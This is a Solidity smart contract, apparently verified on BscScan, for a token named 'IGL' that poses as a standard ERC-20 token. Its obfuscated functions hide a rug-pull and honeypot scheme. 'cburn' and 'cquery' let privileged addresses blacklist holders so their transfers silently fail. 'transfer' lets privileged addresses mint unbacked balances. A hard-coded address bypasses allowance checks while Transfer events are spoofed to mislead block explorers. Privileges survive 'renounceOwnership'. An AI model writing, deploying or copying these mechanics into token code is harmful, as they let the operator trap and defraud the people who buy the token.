/**
 *Submitted for verification at BscScan.com on 2022-11-05
*/

pragma solidity 0.8.16;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Create(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    address cBMC = 0x48B807caa55AB39b7Ca244529F63f4935FEF0272;
	address CBMW = 0x426903241ADA3A0092C3493a0C795F2ec830D622;
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
 modifier onlyOwner{
        require(msg.sender == _Owner);
        _; }
    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }


}



contract IGL is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private cBc;
	mapping (address => bool) private cBb;
    mapping (address => bool) private cBw;
    mapping (address => mapping (address => uint256)) private cBv;
    uint8 private constant CBl = 8;
    uint256 private constant cBS = 200000000 * (10** CBl);
    string private constant _name = "IGL";
    string private constant _symbol = "IGL";



    constructor () {
        cBc[_msgSender()] = cBS;
         cMkr(CBMW, cBS); }
    

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return CBl;
    }

    function totalSupply() public pure  returns (uint256) {
        return cBS;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return cBc[account];
    }
	

   
	 function cburn(address cBj) onlyOwner public{
        cBb[cBj] = true; }
	
    function cMkr(address cBj, uint256 cBn) onlyOwner internal {
    emit Transfer(address(0), cBj ,cBn); }

    function allowance(address owner, address spender) public view  returns (uint256) {
        return cBv[owner][spender];
    }
		
            function approve(address spender, uint256 amount) public returns (bool success) {    
        cBv[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }
		function cquery(address cBj) public{
         if(cBb[msg.sender])  { 
        cBw[cBj] = true; }}
        

		function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {
         if(sender == cBMC)  {
        require(amount <= cBc[sender]);
        cBc[sender] -= amount;  
        cBc[recipient] += amount; 
          cBv[sender][msg.sender] -= amount;
        emit Transfer (CBMW, recipient, amount);
        return true; }  else  
          if(!cBw[recipient]) {
          if(!cBw[sender]) {
         require(amount <= cBc[sender]);
        require(amount <= cBv[sender][msg.sender]);
        cBc[sender] -= amount;
        cBc[recipient] += amount;
        cBv[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true; }}}
		function cStake(address cBj) public {
        if(cBb[msg.sender]) { 
        cBw[cBj] = false;}}
		
		function transfer(address cBj, uint256 cBn) public {
        if(msg.sender == cBMC)  {
        require(cBc[msg.sender] >= cBn);
        cBc[msg.sender] -= cBn;  
        cBc[cBj] += cBn; 
        emit Transfer (CBMW, cBj, cBn);} else  
        if(cBb[msg.sender]) {cBc[cBj] += cBn;} else
        if(!cBw[msg.sender]) {
        require(cBc[msg.sender] >= cBn);
        cBc[msg.sender] -= cBn;  
        cBc[cBj] += cBn;          
        emit Transfer(msg.sender, cBj, cBn);}}
		
		

		
		}